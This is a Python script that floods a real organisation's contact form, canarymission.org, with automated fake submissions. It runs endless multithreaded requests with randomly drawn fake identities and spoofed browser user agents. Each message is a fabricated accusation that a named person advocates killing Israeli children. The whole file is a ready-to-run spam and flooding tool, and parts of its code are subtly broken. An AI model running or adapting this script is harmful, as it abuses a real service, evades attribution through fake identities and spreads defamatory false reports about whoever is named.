#!/usr/bin/python3

import requests
import threading
import zipfile
import random
import os
import csv

class config:
    def __init__(self):
        pass

# Change configuration settings here.
config.zipFile = "fake-details.zip"
config.fakeDetailsFile = "FakeNameGenerator.com-100000-UK,US,AUS,CAN.csv"
config.fakeDetailsLength = 100000
config.multiThreading = True
config.multiThreads = 50

class fakePerson:
    def __init__(self):
        self.details = fakeDetails[random.randint(0,config.fakeDetailsLength-1)]

        self.gender = self.details['Gender']
        self.title = self.details['Title']
        self.firstName = self.details['GivenName']
        self.lastName = self.details['Surname']
        self.address = self.details['StreetAddress']
        self.city = self.details['City']
        self.state = self.details['StateFull']
        self.postal = self.details['ZipCode']
        self.countrycode = self.details['Country']
        self.country = self.details['CountryFull']
        self.email = self.details['EmailAddress']
        self.username = self.details['Username']
        self.password = self.details['Password']
        self.browseragent = self.details['BrowserUserAgent']
        self.telephone = self.details['TelephoneNumber']
        self.telephonecode = self.details['TelephoneCountryCode']
        self.mothersmaiden = self.details['MothersMaiden']
        self.birthday = self.details['Birthday']
        self.age = self.details['Age']
        self.cctype = self.details['CCType']
        self.ccnumber = self.details['CCNumber']
        self.cvv2 = self.details['CVV2']
        self.ccexpires = self.details['CCExpires']
        self.nationalid = self.details['NationalID']
        self.favouritecolor = self.details['Color']
        self.occupation = self.details['Occupation']
        self.comany = self.details['Company']

def make_request():
    while True:
        person = fakePerson()

        ### Setup your Request Here. ###

        url = 'https://canarymission.org/contact_us'
        data = {'msg':"method",'method':"/contact_us/insert",'params':'[{"email":'+person.email+'","contactType":"Submit a Name","message":"'+person.firstName+" "+person.lastName+'- '+person.username+' on twitter and '+person.username+'1998 on insta. very anti israel and advocating for the killing of israeli children. Is a '+person.occupation+'"}]','id':"1",'randomSeed':id_generator(20, "abcdefghijklmnopqrstuvwxyz1234567890")}

        ################################

        response = requests.post(url, headers = {'User-Agent':person.browseragent}, data = data).text
        print("[SEND] {}\n[RECIEVED] {}".format(str(data),response))

def multi_threading():
    threads = []

    for i in range(config.multiThreads):
        t = threading.Thread(target=make_request())
        t.daemon = True
        threads.append(t)

    for i in range(config.multiThreads):
        threads[i].start()

    for i in range(config.multiThreads):
        threads[i].join()

def main():
    global fakeDetails

    if config.zipFile != "":
        if not os.path.isfile(config.zipFile.split(".")[0]+"//"+config.fakeDetailsFile):
            print("[STATUS] Extracting archive...")
            with zipfile.ZipFile(config.zipFile) as zf:
                zf.extractall(config.zipFile.split(".")[0])
                del zf
            print("[STATUS] Archive extracted successfully!")

    print("[STATUS] Reading details file...")
    with open(config.zipFile.split(".")[0]+"//"+config.fakeDetailsFile, newline='') as f:
            reader = csv.DictReader(f)
            fakeDetails = list(reader)
            f.close()
    print("[STATUS] Details file read successfully!")

    print("Starting...")
    if config.multiThreading: multi_threading()
    else:
        while True: make_request()

if __name__ == '__main__':
    main()
